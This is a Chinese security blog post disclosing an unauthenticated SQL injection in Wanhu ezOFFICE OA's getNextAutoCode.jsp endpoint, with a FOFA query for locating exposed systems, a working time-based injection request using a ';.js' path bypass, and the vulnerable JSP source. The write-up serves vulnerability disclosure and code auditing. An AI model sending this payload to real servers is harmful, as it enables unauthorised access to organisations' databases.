---
title: "万户OA getNextAutoCode.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-getNextAutoCode-sqli.html
asset_dir: assets/万户oa-getnextautocode.jsp-sql注入漏洞
---

# 万户OA getNextAutoCode.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/9 19:57
- 995浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

Nessus

计算机安全

安全研究报告

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入防护

# 0x02 漏洞概述

万户 ezOFFICE getNextAutoCode.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

注意由两个路径，代码都是一样的

> platform/custom/custom\_form/run/checkform/getNextAutoCode.jsp  
> platform/custom/ezform/run/getNextAutoCode.jsp
>
> 代码安全审计

```
GET /defaultroot/platform/custom/custom_form/run/checkform/getNextAutoCode.jsp;.js?fieldId=1+WAITFOR+DELAY+'00:00:03'--&fieldName=2&orgName=4&tableId=3 HTTP/1.1
Host: 192.168.22.187:7001
```

成功延时 3 秒

深入探索

Windows安全工具

编码转换工具

SQL

[[![万户OA getNextAutoCode.jsp SQL注入漏洞](images/img-001-3632b6b51d45.png)](https://mrxn.net/content/uploadfile/202501/92a41736424383.png)](https://mrxn.net/content/uploadfile/202501/92a41736424383.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

getNextAutoCode.jsp 代码如下，非常简单！

漏洞预警服务

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
request.setCharacterEncoding("UTF-8");
String fieldId = request.getParameter("fieldId");
String fieldName = request.getParameter("fieldName");
String tableId = request.getParameter("tableId");
String orgName = request.getParameter("orgName");
response.setContentType("text/html; charset=UTF-8");
response.setHeader("Cache-Control","no-cache");
com.whir.ezoffice.customdb.customdb.bd.AutoCode ac = new com.whir.ezoffice.customdb.customdb.bd.AutoCode();
String ret = ac.getAutoCode(fieldId, fieldName, tableId, orgName, null);
out.print(ret);
%>
```

深入探索

技术文章订阅

JSON处理工具

安全工具开发

`getAutoCode` 函数如下

[[![万户OA getNextAutoCode.jsp SQL注入漏洞](images/img-002-54c81f744082.png)](https://mrxn.net/content/uploadfile/202501/393f1736424040.png)](https://mrxn.net/content/uploadfile/202501/393f1736424040.png)

`fieldId` 通过 `request.getParameter` 获取后进入 `getAutoCode` 函数，直接拼接进 `SQL` 语句，然后执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，也是这么朴实无华！

软件

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [6.最后](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

漏洞预警服务
